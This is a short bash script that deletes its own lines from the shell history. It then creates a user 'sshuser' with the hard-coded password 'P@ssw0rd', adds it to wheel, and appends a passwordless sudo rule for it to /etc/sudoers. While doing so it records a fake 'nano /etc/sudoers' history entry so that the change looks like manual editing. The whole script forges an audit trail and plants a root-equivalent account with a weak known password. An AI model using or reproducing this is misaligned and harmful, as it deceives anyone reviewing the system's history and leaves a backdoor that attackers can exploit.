#!/bin/bash
set -e
set -o history

LAST_CMD_NUM=$(history 1 | awk '{print $1}')
if [ ! -z "$LAST_CMD_NUM" ]; then
    PREV_CMD_NUM=$((LAST_CMD_NUM - 1))
    history -d $LAST_CMD_NUM  
    history -d $PREV_CMD_NUM  
fi


run() {
    history -s "$*"
    eval "$*"
}

run "useradd sshuser -u 1010"
run "echo 'sshuser:P@ssw0rd' | chpasswd"
run "usermod -aG wheel sshuser"
history -s "nano /etc/sudoers"
echo "sshuser ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers

history -w
